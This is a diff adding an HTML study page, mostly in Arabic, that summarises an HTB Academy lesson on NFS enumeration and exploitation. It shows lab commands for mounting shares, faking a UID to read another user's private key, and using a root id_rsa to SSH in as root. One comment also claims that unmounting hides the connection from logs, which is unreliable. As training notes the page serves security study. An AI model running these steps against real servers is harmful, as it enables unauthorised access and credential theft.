@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NFS — HTB Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0e14;--bg2:#0d1117;--bg3:#161b22;--border:#21262d;--border2:#30363d;
+  --cyan:#00d4ff;--green:#00ff88;--red:#ff4444;--yellow:#ffd700;--purple:#9d4edd;
+  --text:#c9d1d9;--text2:#8b949e;--text3:#6e7681;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Share Tech Mono',monospace;background:var(--bg);color:var(--text);min-height:100vh;direction:rtl;overflow-x:hidden;}
+body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);pointer-events:none;z-index:9999;}
+.back-bar{padding:12px 20px;border-bottom:1px solid var(--border2);}
+.back-btn{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text3);text-decoration:none;letter-spacing:2px;padding:5px 12px;border:1px solid var(--border2);transition:all .2s;}
+.back-btn:hover{color:var(--cyan);border-color:var(--cyan);}
+.header{background:linear-gradient(180deg,#0a0e14 0%,#0d1117 100%);border-bottom:1px solid var(--cyan);padding:24px 20px 20px;position:relative;overflow:hidden;}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--cyan),var(--green),transparent);}
+.header-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px;}
+.header-label{font-size:10px;color:var(--cyan);letter-spacing:3px;text-transform:uppercase;}
+.header-label::before{content:'► ';}
+.header-badges{display:flex;gap:8px;flex-wrap:wrap;}
+.badge{padding:3px 10px;border:1px solid;font-size:10px;letter-spacing:1px;text-transform:uppercase;}
+.badge.cyan{border-color:var(--cyan);color:var(--cyan);}
+.badge.green{border-color:var(--green);color:var(--green);}
+.badge.red{border-color:var(--red);color:var(--red);}
+.badge.yellow{border-color:var(--yellow);color:var(--yellow);}
+.header-title{font-family:'Rajdhani',sans-serif;font-size:36px;font-weight:700;letter-spacing:4px;color:#fff;text-transform:uppercase;}
+.header-title span{color:var(--cyan);}
+.header-sub{font-size:11px;color:var(--text2);letter-spacing:2px;margin-top:4px;}
+.facts-bar{display:flex;gap:0;border:1px solid var(--border2);margin:16px 0 0;flex-wrap:wrap;}
+.fact-item{flex:1;min-width:120px;padding:10px 14px;border-left:1px solid var(--border2);display:flex;flex-direction:column;gap:4px;}
+.fact-item:last-child{border-left:none;}
+.fact-label{font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;}
+.fact-value{font-size:13px;color:var(--cyan);}
+.nav{background:var(--bg2);border-bottom:1px solid var(--border2);padding:0 20px;display:flex;gap:0;overflow-x:auto;scrollbar-width:none;}
+.nav::-webkit-scrollbar{display:none;}
+.nav-btn{background:none;border:none;border-bottom:2px solid transparent;color:var(--text3);padding:14px 18px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:1px;text-transform:uppercase;white-space:nowrap;transition:all .2s;}
+.nav-btn:hover{color:var(--cyan);border-bottom-color:var(--cyan);}
+.nav-btn.active{color:var(--cyan);border-bottom-color:var(--cyan);background:rgba(0,212,255,.05);}
+.content{padding:20px;max-width:1100px;margin:0 auto;}
+.tab-panel{display:none;}
+.tab-panel.active{display:block;}
+.section-header{display:flex;align-items:center;gap:10px;margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border2);}
+.section-header-line{flex:1;height:1px;background:linear-gradient(90deg,var(--cyan),transparent);}
+.section-title{font-size:11px;color:var(--cyan);letter-spacing:3px;text-transform:uppercase;}
+.section-title::before{content:'[ ';}
+.section-title::after{content:' ]';}
+.card{background:var(--bg3);border:1px solid var(--border2);padding:16px;margin-bottom:14px;position:relative;}
+.card::before{content:'';position:absolute;top:0;right:0;width:3px;height:100%;background:var(--cyan);opacity:.4;}
+.card.danger::before{background:var(--red);opacity:.6;}
+.card.success::before{background:var(--green);opacity:.6;}
+.card-title{font-size:12px;color:var(--cyan);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
+.card-title::before{content:'▸ ';color:var(--green);}
+.code-block{background:#010409;border:1px solid var(--border);border-right:3px solid var(--cyan);padding:14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text);direction:ltr;text-align:left;overflow-x:auto;white-space:pre;line-height:1.6;margin:8px 0;}
+.code-block .cmd{color:var(--cyan);}
+.code-block .ok{color:var(--green);}
+.code-block .err{color:var(--red);}
+.code-block .cmt{color:var(--text3);}
+.code-block .val{color:var(--yellow);}
+table{width:100%;border-collapse:collapse;font-size:11px;margin:10px 0;}
+th{background:#010409;color:var(--cyan);padding:8px 12px;text-align:right;border:1px solid var(--border2);letter-spacing:1px;text-transform:uppercase;font-size:10px;}
+td{padding:7px 12px;border:1px solid var(--border);color:var(--text);vertical-align:top;font-size:11px;}
+tr:nth-child(even) td{background:#0d1117;}
+tr:nth-child(odd) td{background:#010409;}
+td.mono{font-family:'Share Tech Mono',monospace;color:var(--cyan);}
+td.danger{color:var(--red);}
+td.safe{color:var(--green);}
+td.warn{color:var(--yellow);}
+.alert{padding:10px 14px;font-size:11px;margin:8px 0;border-right:3px solid;direction:rtl;line-height:1.6;}
+.alert.danger{background:rgba(255,68,68,.08);border-color:var(--red);color:#ff8888;}
+.alert.success{background:rgba(0,255,136,.08);border-color:var(--green);color:#88ffbb;}
+.alert.info{background:rgba(0,212,255,.08);border-color:var(--cyan);color:#88e4ff;}
+.alert.warning{background:rgba(255,215,0,.08);border-color:var(--yellow);color:#ffe566;}
+.tag{display:inline-block;padding:2px 8px;font-size:10px;letter-spacing:1px;text-transform:uppercase;margin:2px;font-family:'Share Tech Mono',monospace;}
+.tag.cyan{background:rgba(0,212,255,.1);border:1px solid var(--cyan);color:var(--cyan);}
+.tag.green{background:rgba(0,255,136,.1);border:1px solid var(--green);color:var(--green);}
+.tag.red{background:rgba(255,68,68,.1);border:1px solid var(--red);color:var(--red);}
+.tag.yellow{background:rgba(255,215,0,.1);border:1px solid var(--yellow);color:var(--yellow);}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0;}
+.info-box{background:#010409;border:1px solid var(--border2);padding:12px;}
+.info-box-title{font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.chain{display:flex;align-items:center;gap:0;flex-wrap:wrap;margin:12px 0;}
+.chain-step{flex:1;min-width:80px;background:var(--bg3);border:1px solid var(--border2);padding:10px 8px;text-align:center;font-size:10px;}
+.chain-step .step-icon{font-size:18px;margin-bottom:4px;}
+.chain-step .step-name{color:var(--text);font-size:10px;}
+.chain-step .step-sub{color:var(--text3);font-size:9px;margin-top:2px;}
+.chain-step.highlight{border-color:var(--red);background:rgba(255,68,68,.05);}
+.chain-arrow{color:var(--cyan);font-size:14px;padding:0 4px;}
+.method-step{display:flex;gap:14px;padding:12px 0;border-bottom:1px solid var(--border);align-items:flex-start;}
+.method-step:last-child{border-bottom:none;}
+.method-num{background:var(--cyan);color:#000;width:24px;height:24px;min-width:24px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:bold;margin-top:2px;}
+.method-content{flex:1;}
+.method-title{color:var(--cyan);font-size:12px;margin-bottom:4px;}
+.method-desc{color:var(--text2);font-size:11px;line-height:1.6;}
+.convo{margin:10px 0;}
+.convo-q{background:rgba(0,212,255,.05);border:1px solid var(--cyan);padding:10px 14px;margin-bottom:6px;font-size:12px;color:var(--cyan);}
+.convo-q::before{content:'❓ سؤال: ';color:var(--yellow);}
+.convo-a{background:rgba(0,255,136,.05);border:1px solid var(--green);padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text);line-height:1.6;}
+.convo-a::before{content:'✅ الجواب: ';color:var(--green);}
+.label{font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin:10px 0 6px;}
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;margin:12px 0;}
+.tool-btn{background:var(--bg3);border:1px solid var(--border2);padding:12px 8px;text-align:center;cursor:pointer;transition:all .2s;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);}
+.tool-btn:hover{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.05);}
+.tool-btn.active{border-color:var(--green);color:var(--green);background:rgba(0,255,136,.05);}
+.tool-btn .tool-icon{font-size:20px;margin-bottom:6px;display:block;}
+.tool-panel{display:none;}
+.tool-panel.active{display:block;}
+@media(max-width:600px){.grid-2{grid-template-columns:1fr;}.chain{flex-direction:column;}}
+</style>
+</head>
+<body>
+
+<div class="back-bar"><a href="protocols.html" class="back-btn">◄ BACK TO PROTOCOLS</a></div>
+
+<div class="header">
+  <div class="header-top">
+    <div class="header-label">HTB Academy · Module 112 · Section 8/21</div>
+    <div class="header-badges">
+      <span class="badge cyan">Footprinting</span>
+      <span class="badge green">Port 2049</span>
+      <span class="badge red">UID/GID Abuse</span>
+      <span class="badge yellow">Linux/Unix</span>
+    </div>
+  </div>
+  <div class="header-title"><span>NFS</span> — NETWORK FILE SYSTEM</div>
+  <div class="header-sub">PROTOCOL ANALYSIS · ENUMERATION · EXPLOITATION VECTORS</div>
+  <div class="facts-bar">
+    <div class="fact-item"><div class="fact-label">Developer</div><div class="fact-value">Sun Microsystems</div></div>
+    <div class="fact-item"><div class="fact-label">Port RPC</div><div class="fact-value">TCP/UDP 111</div></div>
+    <div class="fact-item"><div class="fact-label">Port NFS</div><div class="fact-value">TCP/UDP 2049</div></div>
+    <div class="fact-item"><div class="fact-label">Auth</div><div class="fact-value" style="color:var(--red)">UID/GID ⚠️</div></div>
+    <div class="fact-item"><div class="fact-label">OS</div><div class="fact-value">Linux / Unix</div></div>
+    <div class="fact-item"><div class="fact-label">Config File</div><div class="fact-value">/etc/exports</div></div>
+  </div>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showPanel('overview',this)">Overview</button>
+  <button class="nav-btn" onclick="showPanel('versions',this)">Versions</button>
+  <button class="nav-btn" onclick="showPanel('config',this)">Config</button>
+  <button class="nav-btn" onclick="showPanel('danger',this)">Danger Settings</button>
+  <button class="nav-btn" onclick="showPanel('tools',this)">Tools</button>
+  <button class="nav-btn" onclick="showPanel('methodology',this)">Methodology</button>
+  <button class="nav-btn" onclick="showPanel('explained',this)">Explained Q&A</button>
+</div>
+
+<div class="content">
+
+<!-- OVERVIEW -->
+<div id="panel-overview" class="tab-panel active">
+  <div class="section-header"><div class="section-title">نظرة عامة</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">ما هو NFS؟</div>
+    <p style="color:var(--text);font-size:12px;line-height:1.8;margin-bottom:12px;">Network File System — نظام ملفات شبكي طوّرته Sun Microsystems. نفس فكرة SMB بالضبط: الوصول للملفات عبر الشبكة كأنها محلية. بس يستخدم بروتوكول مختلف كلياً ويشتغل بين Linux وUnix فقط.</p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">NFS vs SMB</div>
+        <div style="font-size:11px;line-height:1.8;">
+          <div style="margin-bottom:6px;direction:ltr;">
+            <span style="color:var(--cyan);">SMB</span> <span style="color:var(--text3);">→ Windows + Linux (Samba)</span>
+          </div>
+          <div style="margin-bottom:6px;direction:ltr;">
+            <span style="color:var(--green);">NFS</span> <span style="color:var(--text3);">→ Linux + Unix فقط</span>
+          </div>
+          <div style="direction:ltr;">
+            <span style="color:var(--red);">NFS clients</span> <span style="color:var(--text3);">≠ SMB servers مباشرة</span>
+          </div>
+        </div>
+        <div class="alert warning" style="margin-top:8px;">شبكة Windows+Linux → استخدم SMB/Samba</div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">🔌 Ports</div>
+        <div style="display:flex;flex-direction:column;gap:8px;direction:ltr;margin-top:6px;">
+          <div style="background:rgba(255,215,0,.08);border:1px solid var(--yellow);padding:8px 12px;font-size:11px;">
+            <div style="color:var(--yellow);margin-bottom:3px;">PORT 111 — RPC Portmapper</div>
+            <div style="color:var(--text3);">دليل هاتف الخدمات — يخبرك وين NFS</div>
+          </div>
+          <div style="background:rgba(0,255,136,.08);border:1px solid var(--green);padding:8px 12px;font-size:11px;">
+            <div style="color:var(--green);margin-bottom:3px;">PORT 2049 — NFS</div>
+            <div style="color:var(--text3);">الخدمة الفعلية — نقل الملفات</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⚠️ Authentication — الثغرة الأساسية</div>
+    <p style="color:var(--text2);font-size:12px;line-height:1.8;margin-bottom:10px;">NFS بحد ذاته ما عنده authentication — يعتمد على RPC. والمصادقة الأكثر شيوعاً عبر <strong style="color:var(--cyan);">UNIX UID/GID</strong>.</p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">المشكلة الخطيرة</div>
+        <div style="direction:ltr;font-size:11px;line-height:1.8;">
+          <div style="color:var(--text2);">Server: UID 1000 = cry0l1t3</div>
+          <div style="color:var(--red);">Your PC: UID 1000 = attacker</div>
+          <div style="color:var(--text3);margin-top:4px;">NFS ما يفرق!</div>
+          <div style="color:var(--green);margin-top:4px;">= تقرأ ملفات cry0l1t3 🎯</div>
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">الاستغلال العملي</div>
+        <div class="code-block" style="margin:0;border-right:none;">sudo useradd -u 1000 attacker
+sudo su attacker
+# هلأ أنت UID 1000
+# NFS يحسبك cry0l1t3!</div>
+      </div>
+    </div>
+    <div class="alert danger">⚠️ NFS يجب استخدامه على trusted networks فقط بسبب ضعف الـ authentication!</div>
+  </div>
+</div>
+
+<!-- VERSIONS -->
+<div id="panel-versions" class="tab-panel">
+  <div class="section-header"><div class="section-title">إصدارات NFS</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">📋 المقارنة الكاملة</div>
+    <table>
+      <tr><th>الإصدار</th><th>الميزات</th><th>Auth</th><th>Port</th></tr>
+      <tr>
+        <td><span class="tag yellow">NFSv2</span></td>
+        <td style="color:var(--text2);">قديم، يشتغل على UDP، مدعوم من أنظمة كثيرة</td>
+        <td class="warn">جهاز فقط</td>
+        <td class="mono">111 + عشوائي</td>
+      </tr>
+      <tr>
+        <td><span class="tag yellow">NFSv3</span></td>
+        <td style="color:var(--text2);">ملفات أكبر من 2GB، better error reporting، مش متوافق مع v2</td>
+        <td class="warn">جهاز فقط</td>
+        <td class="mono">111 + عشوائي</td>
+      </tr>
+      <tr>
+        <td><span class="tag green">NFSv4</span></td>
+        <td style="color:var(--text2);">Kerberos، يشتغل عبر Firewall، ACLs، stateful، pNFS، multipathing</td>
+        <td class="safe">يوزر (Kerberos)</td>
+        <td class="mono">2049 فقط ✅</td>
+      </tr>
+    </table>
+
+    <div class="grid-2" style="margin-top:14px;">
+      <div class="info-box">
+        <div class="info-box-title">NFSv3 Authentication — الجهاز</div>
+        <div style="direction:ltr;font-size:11px;line-height:1.8;color:var(--text2);">
+          "هاد الجهاز IP 192.168.1.5 مسموح له"<br>
+          <span style="color:var(--red);">أي شخص على هاد الجهاز يدخل! 😱</span>
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">NFSv4 Authentication — اليوزر</div>
+        <div style="direction:ltr;font-size:11px;line-height:1.8;color:var(--text2);">
+          "مين أنت؟ TGT من Kerberos؟"<br>
+          <span style="color:var(--green);">كل شخص يثبت هويته ✅</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔑 Kerberos في NFSv4</div>
+    <p style="color:var(--text2);font-size:12px;line-height:1.8;margin-bottom:10px;">بدل ما ترسل باسورد على الشبكة — Kerberos يعطيك تذكرة مشفرة (TGT):</p>
+    <div style="direction:ltr;display:flex;flex-direction:column;gap:4px;font-size:11px;">
+      <div style="background:#010409;border:1px solid var(--border2);padding:8px 12px;color:var(--text2);">1. أنت → "أنا husein" → Kerberos Server</div>
+      <div style="text-align:center;color:var(--cyan);">↓</div>
+      <div style="background:#010409;border:1px solid var(--cyan);padding:8px 12px;color:var(--cyan);">2. Kerberos → يعطيك TGT (Ticket Granting Ticket) مشفر</div>
+      <div style="text-align:center;color:var(--cyan);">↓</div>
+      <div style="background:#010409;border:1px solid var(--border2);padding:8px 12px;color:var(--text2);">3. أنت → TGT → NFS Server</div>
+      <div style="text-align:center;color:var(--cyan);">↓</div>
+      <div style="background:#010409;border:1px solid var(--green);padding:8px 12px;color:var(--green);">4. NFS يتحقق → مسموح ✅ أو مرفوض ❌</div>
+    </div>
+    <div class="alert info" style="margin-top:10px;">💡 TGT = بيانات مشفرة — ما في باسورد يمشي على الشبكة أبداً!</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔍 كيف تعرف الإصدار؟</div>
+    <div class="code-block"><span class="cmd">sudo nmap 10.129.14.128 -p111,2049 -sV -sC</span>
+
+PORT    STATE SERVICE
+<span class="ok">111/tcp open  rpcbind</span>
+| rpcinfo:
+|   100003  <span class="val">3</span>    2049/tcp  nfs      <span class="cmt">← NFSv3</span>
+|   100003  <span class="val">3,4</span>  2049/tcp  nfs      <span class="cmt">← NFSv3 + v4</span>
+|   100005  1,2,3  45837/tcp mountd   <span class="cmt">← ports عشوائية = v3</span>
+|   100021  1,3,4  44629/tcp nlockmgr
+<span class="ok">2049/tcp open  nfs_acl</span></div>
+    <div class="alert info">💡 ports عشوائية (mountd, nlockmgr) = NFSv3 مؤكد. NFSv4 = Port 2049 فقط!</div>
+  </div>
+</div>
+
+<!-- CONFIG -->
+<div id="panel-config" class="tab-panel">
+  <div class="section-header"><div class="section-title">الإعدادات — /etc/exports</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">ملف الإعداد</div>
+    <p style="color:var(--text2);font-size:11px;margin-bottom:10px;">ملف الإعداد: <code style="color:var(--cyan);">/etc/exports</code> — يحدد أي مجلدات مشارَكة ولمن.</p>
+    <div class="code-block"><span class="cmd">cat /etc/exports</span>
+
+<span class="cmt"># مثال NFSv3:</span>
+/srv/homes hostname1(<span class="val">rw</span>,sync,no_subtree_check)
+/srv/homes hostname2(<span class="ok">ro</span>,sync,no_subtree_check)
+
+<span class="cmt"># مثال NFSv4:</span>
+/srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt)</div>
+    <div class="alert info">💡 البنية: <code style="color:var(--cyan);">المجلد  الجهاز/subnet(صلاحيات)</code></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📋 شرح الخيارات</div>
+    <table>
+      <tr><th>الخيار</th><th>الوظيفة</th></tr>
+      <tr><td class="mono">rw</td><td>قراءة وكتابة</td></tr>
+      <tr><td class="mono">ro</td><td>قراءة فقط</td></tr>
+      <tr><td class="mono">sync</td><td>نقل بيانات متزامن (أبطأ لكن أأمن)</td></tr>
+      <tr><td class="mono">async</td><td>نقل بيانات غير متزامن (أسرع)</td></tr>
+      <tr><td class="mono">secure</td><td>ports فوق 1024 ممنوعة</td></tr>
+      <tr><td class="mono">insecure</td><td class="danger">ports فوق 1024 مسموحة</td></tr>
+      <tr><td class="mono">no_subtree_check</td><td>تعطيل فحص المجلدات الفرعية</td></tr>
+      <tr><td class="mono">root_squash</td><td class="safe">root على الـ client = anonymous على السيرفر ✅</td></tr>
+      <tr><td class="mono">no_root_squash</td><td class="danger">root على الـ client = root على السيرفر ⚠️</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">مثال عملي — إضافة Share</div>
+    <div class="code-block"><span class="cmd">echo '/mnt/nfs 10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports</span>
+<span class="cmd">systemctl restart nfs-kernel-server</span>
+<span class="cmd">exportfs</span>
+
+<span class="ok">/mnt/nfs  10.129.14.0/24</span>
+<span class="cmt"># كل الأجهزة في الـ subnet يقدرون يـ mount هاد المجلد</span></div>
+  </div>
+</div>
+
+<!-- DANGER -->
+<div id="panel-danger" class="tab-panel">
+  <div class="section-header"><div class="section-title">Dangerous Settings</div><div class="section-header-line"></div></div>
+
+  <div class="card danger">
+    <div class="card-title">⚠️ الإعدادات الخطيرة</div>
+    <table>
+      <tr><th>الإعداد</th><th>الخطر</th></tr>
+      <tr><td class="mono">rw</td><td class="danger">كتابة كاملة — رفع ملفات خبيثة</td></tr>
+      <tr><td class="mono">insecure</td><td class="danger">أي يوزر عادي يتصل بدون ما يكون root</td></tr>
+      <tr><td class="mono">nohide</td><td class="danger">يكشف مجلدات مخفية مـ mount فيها</td></tr>
+      <tr><td class="mono">no_root_squash</td><td class="danger">root على جهازك = root على السيرفر 💀</td></tr>
+      <tr><td class="mono">*(rw,no_root_squash)</td><td class="danger">أخطر إعداد — أي IP + root كامل 💀💀</td></tr>
+    </table>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">💀 root_squash vs no_root_squash</div>
+    <div class="grid-2">
+      <div style="background:#010409;border:1px solid var(--green);padding:12px;">
+        <div style="color:var(--green);font-size:11px;margin-bottom:8px;">✅ root_squash (آمن)</div>
+        <div style="direction:ltr;font-size:11px;line-height:1.8;color:var(--text2);">
+          أنت root على جهازك<br>
+          ↓<br>
+          NFS يحولك لـ anonymous (UID 65534)<br>
+          ↓<br>
+          ما تقدر تعدل ملفات root على السيرفر ✅
+        </div>
+      </div>
+      <div style="background:#010409;border:1px solid var(--red);padding:12px;">
+        <div style="color:var(--red);font-size:11px;margin-bottom:8px;">⚠️ no_root_squash (خطير)</div>
+        <div style="direction:ltr;font-size:11px;line-height:1.8;color:var(--text2);">
+          أنت root على جهازك<br>
+          ↓<br>
+          NFS يعطيك root على السيرفر<br>
+          ↓<br>
+          تقرأ id_rsa وتدخل كـ root 💀
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">💀 UID/GID Impersonation Attack</div>
+    <div class="chain">
+      <div class="chain-step"><div class="step-icon">🔍</div><div class="step-name">Mount NFS</div><div class="step-sub">target-NFS/</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔢</div><div class="step-name">ls -n</div><div class="step-sub">شوف UID/GID</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">👤</div><div class="step-name">useradd -u</div><div class="step-sub">نفس الـ UID</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔄</div><div class="step-name">su attacker</div><div class="step-sub">تحول للـ UID</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step highlight"><div class="step-icon">💥</div><div class="step-name">Full Access</div><div class="step-sub">ملفات اليوزر</div></div>
+    </div>
+    <div class="alert danger">🎯 السيرفر يتحقق من الـ UID — مش اسم اليوزر. اصنع يوزر بنفس الـ UID = تنتحل هويته!</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔑 id_rsa على NFS = خطر كبير</div>
+    <div class="code-block"><span class="cmt"># لو لاقيت id_rsa على الـ share:</span>
+<span class="cmd">ls -n mnt/nfs/</span>
+-rw-r--r-- 1 <span class="val">0</span> <span class="val">0</span> 1872 id_rsa  <span class="cmt">← UID 0 = root!</span>
+
+<span class="cmt"># حمّله واستخدمه:</span>
+<span class="cmd">cp mnt/nfs/id_rsa .</span>
+<span class="cmd">chmod 600 id_rsa</span>
+<span class="cmd">ssh -i id_rsa root@10.129.14.128</span>
+<span class="ok">root@server:~#</span>  <span class="cmt">← root access كامل 👑</span></div>
+    <div class="alert danger">💀 Private SSH keys على NFS = باب مفتوح للسيرفر كله!</div>
+  </div>
+</div>
+
+<!-- TOOLS -->
+<div id="panel-tools" class="tab-panel">
+  <div class="section-header"><div class="section-title">الأدوات</div><div class="section-header-line"></div></div>
+
+  <div class="label">اختر الأداة:</div>
+  <div class="tool-grid">
+    <div class="tool-btn active" onclick="showTool('nmap',this)"><span class="tool-icon">🔍</span>Nmap</div>
+    <div class="tool-btn" onclick="showTool('showmount',this)"><span class="tool-icon">📋</span>showmount</div>
+    <div class="tool-btn" onclick="showTool('mount',this)"><span class="tool-icon">🔌</span>mount</div>
+    <div class="tool-btn" onclick="showTool('ls',this)"><span class="tool-icon">📂</span>ls -n</div>
+    <div class="tool-btn" onclick="showTool('uid',this)"><span class="tool-icon">👤</span>UID Attack</div>
+  </div>
+
+  <!-- NMAP -->
+  <div id="tool-nmap" class="tool-panel active">
+    <div class="card"><div class="card-title">🔍 Nmap على NFS</div>
+    <div class="label">Scan أساسي:</div>
+    <div class="code-block"><span class="cmd">sudo nmap 10.129.14.128 -p111,2049 -sV -sC</span>
+
+PORT    STATE SERVICE VERSION
+<span class="ok">111/tcp open  rpcbind 2-4 (RPC #100000)</span>
+| rpcinfo:
+|   100003  3,4  2049/tcp  nfs
+|   100005  1,2,3  45837/tcp  mountd
+|   100021  1,3,4  44629/tcp  nlockmgr
+<span class="ok">2049/tcp open  nfs_acl 3 (RPC #100227)</span></div>
+    <div class="label">NSE Scripts — كل شيء دفعة:</div>
+    <div class="code-block"><span class="cmd">sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049</span>
+
+| nfs-ls: Volume /mnt/nfs
+|   <span class="val">id_rsa</span>      UID:0   GID:0   <span class="cmt">← root file!</span>
+|   id_rsa.pub  UID:0   GID:0
+|   nfs.share   UID:0   GID:0
+|
+| nfs-showmount:
+|_  /mnt/nfs <span class="ok">10.129.14.0/24</span>
+|
+| nfs-statfs:
+|_  /mnt/nfs  30GB total, 8GB used</div>
+    <div class="alert success">💡 nfs* = شغّل كل NSE scripts تبدأ بـ nfs دفعة وحدة!</div>
+    </div>
+  </div>
+
+  <!-- SHOWMOUNT -->
+  <div id="tool-showmount" class="tool-panel">
+    <div class="card"><div class="card-title">📋 showmount — عرض الـ Shares</div>
+    <div class="code-block"><span class="cmd">showmount -e 10.129.14.128</span>
+
+Export list for 10.129.14.128:
+<span class="ok">/mnt/nfs  10.129.14.0/24</span>
+<span class="cmt"># المجلد المشارَك + من يقدر يوصله</span></div>
+    <div class="alert info">💡 أسرع طريقة لتشوف الـ NFS shares قبل الـ mount</div>
+    </div>
+  </div>
+
+  <!-- MOUNT -->
+  <div id="tool-mount" class="tool-panel">
+    <div class="card"><div class="card-title">🔌 mount — توصيل الـ Share</div>
+    <div class="code-block"><span class="cmd">mkdir target-NFS</span>
+<span class="cmd">sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock</span>
+<span class="cmd">cd target-NFS && tree .</span>
+
+.
+└── mnt
+    └── nfs
+        ├── <span class="val">id_rsa</span>
+        ├── id_rsa.pub
+        └── nfs.share</div>
+    <div class="label">بعد ما تخلص — umount:</div>
+    <div class="code-block"><span class="cmd">cd .. && sudo umount ./target-NFS</span>
+<span class="cmt"># مهم! يوقف تسجيل اتصالك في الـ logs</span></div>
+    <div class="alert warning">
+      ⚠️ خيارات الأمر:<br>
+      -t nfs = النوع NFS<br>
+      -o nolock = بدون file locking (يشتغل مع سيرفرات قديمة)<br>
+      IP:/ = الـ root كامل للسيرفر
+    </div>
+    </div>
+  </div>
+
+  <!-- LS -N -->
+  <div id="tool-ls" class="tool-panel">
+    <div class="card"><div class="card-title">📂 ls -n — عرض UID/GID</div>
+    <div class="code-block"><span class="cmd">ls -l mnt/nfs/</span>
+<span class="cmt"># يعرض أسماء المستخدمين:</span>
+-rw-r--r-- 1 cry0l1t3 cry0l1t3  cry0l1t3.priv
+-rw-r--r-- 1 root     root      id_rsa
+
+<span class="cmd">ls -n mnt/nfs/</span>
+<span class="cmt"># يعرض الأرقام UID/GID:</span>
+-rw-r--r-- 1 <span class="val">1000</span> <span class="val">1000</span>  cry0l1t3.priv
+-rw-r--r-- 1 <span class="val">0</span>    <span class="val">0</span>     id_rsa
+-rw-r--r-- 1 <span class="val">0</span>    <span class="val">1000</span>  backup.sh</div>
+    <div class="alert info">💡 ls -n يعطيك الأرقام الفعلية — هاي اللي تحتاجها لـ UID impersonation!</div>
+    </div>
+  </div>
+
+  <!-- UID ATTACK -->
+  <div id="tool-uid" class="tool-panel">
+    <div class="card"><div class="card-title">👤 UID Impersonation Attack</div>
+    <div class="code-block"><span class="cmt"># 1. شوف الـ UID من الـ share</span>
+<span class="cmd">ls -n mnt/nfs/</span>
+-rw-r--r-- 1 <span class="val">1000</span> 1000  cry0l1t3.priv
+
+<span class="cmt"># 2. اصنع يوزر بنفس الـ UID</span>
+<span class="cmd">sudo useradd -u 1000 attacker</span>
+
+<span class="cmt"># 3. تحول للـ يوزر</span>
+<span class="cmd">sudo su attacker</span>
+
+<span class="cmt"># 4. هلأ أنت UID 1000 = cry0l1t3 على NFS!</span>
+<span class="cmd">cat mnt/nfs/cry0l1t3.priv</span>
+<span class="ok">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="ok">b3BlbnNzaC1rZXktdjEAAAAA...</span></div>
+    <div class="alert danger">💀 لو UID 0 = تقدر تقرأ id_rsa = ssh كـ root مباشرة!</div>
+    </div>
+  </div>
+</div>
+
+<!-- METHODOLOGY -->
+<div id="panel-methodology" class="tab-panel">
+  <div class="section-header"><div class="section-title">Methodology</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">⛓️ خطوات الهجوم الكاملة</div>
+    <div class="method-step">
+      <div class="method-num">1</div>
+      <div class="method-content">
+        <div class="method-title">Nmap Scan</div>
+        <div class="method-desc">اكتشاف ports 111/2049 + إصدار NFS + محتوى الـ shares</div>
